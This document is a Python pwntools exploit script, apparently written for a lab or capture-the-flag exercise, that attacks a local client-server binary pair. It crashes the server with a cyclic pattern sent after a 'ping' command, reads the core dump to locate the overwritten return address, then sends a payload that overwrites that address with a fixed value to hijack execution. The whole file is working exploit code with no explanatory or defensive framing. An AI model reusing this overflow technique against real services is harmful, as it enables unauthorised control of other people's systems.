from pwn import *
import os
try:
        os.remove("/tmp/core")
except:
        pass
        
context.clear(arch= 'amd64')

# try to set up core file location for the crashing part. If Permission denied,
# do not crash the program and use hardcoded offset since core file location depends on the machine.crash = True
crash = True
try:
        with open('/proc/sys/kernel/core_pattern', 'w') as f:
                f.write('/tmp/core')
except:
        crash = False

hijackFlowAddr = 0x555555569b12
manualServer = False     

# trigger a segfault (server-side) and find the offset to the overwritten return address by looking at the core file
if crash:
        server = process(['bin/server'])
        client = process(['bin/client', '127.0.0.1', '1337'])

        # Generate a cyclic pattern so that we can auto-find the offset
        payload = cyclic(900)  
        payload = "ping " + payload
        client.sendline(payload)
        server.wait_for_close()
        #Get the core dump
        core = Coredump('/tmp/core')
        rip = hex(core.rip)
        faultAddr = hex(core.fault_addr)
        faultAddrLSB = faultAddr[-8:]
        client.close()
        server.close()  
else:
	faultAddr = hex(0x6161676961616669)
	faultAddrLSB = faultAddr[-8:]

if not manualServer:
        server = process(['bin/server'])

client = process(['bin/client', '127.0.0.1', '1337'])

exploit = cyclic(cyclic_find(int(faultAddrLSB, 16)) - 10)
exploit += "AAAAAAAAAA" + p64(hijackFlowAddr) 
exploit = "ping " + exploit
print(len(exploit))
client.sendline(exploit)
if not manualServer:
        res = server.recvall(timeout=1)
        print res
client.close()

if not manualServer:
        server.close()




